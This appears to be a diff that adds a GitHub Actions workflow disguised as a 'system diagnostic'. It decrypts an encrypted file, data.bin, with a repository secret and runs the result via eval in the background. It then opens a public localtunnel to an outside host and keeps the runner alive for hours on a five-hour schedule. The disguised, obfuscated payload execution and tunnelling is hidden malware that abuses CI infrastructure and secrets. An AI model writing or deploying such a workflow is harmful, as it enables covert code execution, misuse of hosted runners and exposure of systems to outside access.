@@ -1,0 +1,29 @@
+name: System_Diagnostic_Core
+
+on:
+  schedule:
+    - cron: '0 */5 * * *'
+  workflow_dispatch:
+
+jobs:
+  service-runtime:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment Setup
+        run: npm install peer localtunnel
+
+      - name: Start System Process
+        env:
+          CORE_ACCESS_TOKEN: ${{ secrets.MASTER_KEY }}
+        run: |
+          # Расшифровка и запуск в фоновом режиме
+          node -e "const c=require('crypto'),fs=require('fs');const d=fs.readFileSync('data.bin'),s=d.slice(0,16),i=d.slice(16,32),e=d.slice(32),k=c.pbkdf2Sync(process.env.CORE_ACCESS_TOKEN,s,100000,32,'sha256'),p=c.createDecipheriv('aes-256-cbc',k,i);let r=p.update(e);r=Buffer.concat([r,p.final()]);eval(r.toString());" &
+          
+          sleep 15
+          # Замени 'my-secure-mesh-node' на свой уникальный адрес
+          npx lt --port 9000 --subdomain my-secure-mesh-node &
+          
+          echo "System diagnostic running..."
+          sleep 20000
